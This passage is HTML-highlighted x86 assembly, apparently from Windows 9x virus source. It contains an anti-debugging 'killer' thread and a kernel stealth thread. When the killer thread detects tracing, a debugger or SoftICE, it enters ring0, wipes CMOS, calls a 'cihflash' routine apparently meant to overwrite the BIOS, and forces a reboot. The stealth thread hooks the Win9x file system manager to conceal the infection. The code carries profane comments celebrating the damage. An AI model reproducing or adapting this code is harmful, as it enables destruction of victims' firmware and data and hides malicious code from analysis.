            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">Sleep</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">onlyne</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__not_onlyne</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__onlyne_loop</span><span class="sc0">

</span><span class="sc5">__not_onlyne</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_onlyne_flag</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">inet_threadz</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">INET_THREADZ_COUNT</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">WaitForMultipleObjects</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WAIT_TIMEOUT</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__close_threads</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">inet_threadz</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">INET_THREADZ_COUNT</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__kill_threads</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">TerminateThread</span><span class="sc0">
    
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__kill_threads</span><span class="sc0">

</span><span class="sc5">__close_threads</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">inet_threadz</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">INET_THREADZ_COUNT</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__close_handles</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__close_handles</span><span class="sc0">

            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">WSACleanup</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">heap_handle</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">HeapDestroy</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__main_thread</span><span class="sc0">

</span><span class="sc5">killer_thread</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">killdelta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_killa</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">killdelta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">TRAP_TEST</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_traced</span><span class="sc0"> </span><span class="sc5">_killa</span><span class="sc0">         </span><span class="sc1">; calculate offset of _traced_off</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_traced_off</span><span class="sc0"> </span><span class="sc5">_killa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; and store it</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__trap</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_traced_off</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; byte ptr [ebp+_traced-gdelta], set the mark</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__trap</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; set new SEH frame</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; set TF (bit 8)</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; add esp, 4 if it was an exception, otherwise remove the return address</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_traced</span><span class="sc0"> </span><span class="sc5">_killa</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">js</span><span class="sc0">  </span><span class="sc5">__do_fuckup</span><span class="sc0">             </span><span class="sc1">; some asshole is tracing us...</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; TRAP_TEST</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">cdq</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc5">edx.TEB_ClientId.CID_UniqueProcess</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; test app-level debugger</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc5">jecxnz</span><span class="sc0">  </span><span class="sc5">__do_fuckup</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetTickCount</span><span class="sc0"> </span><span class="sc5">_killa</span><span class="sc0"> 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetTickCount</span><span class="sc0"> </span><span class="sc5">_killa</span><span class="sc0"> 
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__do_fuckup</span><span class="sc0">
            
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0">\\</span><span class="sc5">.</span><span class="sc0">\</span><span class="sc5">SICE</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">cdq</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CreateFileA</span><span class="sc0"> </span><span class="sc5">_killa</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__do_fuckup</span><span class="sc0">
            
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cycle</span><span class="sc0">

</span><span class="sc5">__do_fuckup</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__r0_fuckup</span><span class="sc0"> </span><span class="sc5">_killa</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_in_ring0</span><span class="sc0">

</span><span class="sc5">__r0_fuckup</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; fuck CMOS</span><span class="sc0">
</span><span class="sc5">__cmos</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cmos</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cihflash</span><span class="sc0">                </span><span class="sc1">; yo momma :))</span><span class="sc0">

            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0">                 </span><span class="sc1">; hang 'em all!</span><span class="sc0">
            
</span><span class="sc5">killer_thread</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">stealth_thread2</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">stealthdlta2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_STLTH2</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">stealthdlta2</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_this_name</span><span class="sc0"> </span><span class="sc5">_STLTH2</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetModuleFileNameA</span><span class="sc0"> </span><span class="sc5">_STLTH2</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__1</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">__this_length</span><span class="sc0"> </span><span class="sc5">_STLTH2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__ring_fs</span><span class="sc0"> </span><span class="sc5">_STLTH2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_in_ring0</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">__ring_fs</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0">       </span><span class="sc1">; flags</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; *PhysAddr</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; maxPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; minPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; AlignMask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; handle of VM (==0 if PG_SYS)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PG_SYS</span><span class="sc0">                  </span><span class="sc1">; pType</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">stealthsplore_size</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">    </span><span class="sc1">; nPages</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageAllocate</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; eax = mem handle</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PC_STATIC</span><span class="sc0">                       </span><span class="sc1">; OR_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">PC_WRITEABLE</span><span class="sc4">+</span><span class="sc5">PC_USER</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; AND_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">stealthsplore_size</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageModifyPermissions</span><span class="sc0">           </span><span class="sc1">; make pages inaccessible from ring3</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stealthsplore_start</span><span class="sc0"> </span><span class="sc5">_STLTH2</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stealthsplore_size</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__old_hook</span><span class="sc4">-</span><span class="sc5">stealthsplore_start</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Get_DDB</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end</span><span class="sc0">
        
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSApiHook_hook</span><span class="sc4">-</span><span class="sc5">stealthsplore_start</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hook_service</span><span class="sc0">
            </span><span class="sc1">;pop    edi                 ; uncomment this if u want to to use IFSApiHook..</span><span class="sc0">
            </span><span class="sc1">;push   edi</span><span class="sc0">
            </span><span class="sc1">;xchg   esi, [edi+_origifshook-stealthsplore_start]</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO_hook</span><span class="sc4">-</span><span class="sc5">stealthsplore_start</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hook_service</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">_orig_Ring0_FileIO</span><span class="sc4">-</span><span class="sc5">stealthsplore_start</span><span class="sc4">]</span><span class="sc0">
        
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">stealthsplore_start</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; u have no fuckin idea how much gpf did it took me </span><span class="sc0">
                                    </span><span class="sc1">; to realize that ebx modification fucks-up kernel..</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">_sploredlta</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_STLTH2_</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">_sploredlta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">

</span><span class="sc5">__quit</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0beh</span><span class="sc0">
</span><span class="sc5">__old_hook</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ifs_first_run</span><span class="sc0"> </span><span class="sc5">_STLTH2_</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__continue</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ifs_first_run</span><span class="sc0"> </span><span class="sc5">_STLTH2_</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        
            </span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc5">__find_sys</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__find_sys</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">sys_handler</span><span class="sc0"> </span><span class="sc5">_STLTH2_</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__continue</span><span class="sc4">:</span><span class="sc0">     
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">sys_handler</span><span class="sc0"> </span><span class="sc5">_STLTH2_</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

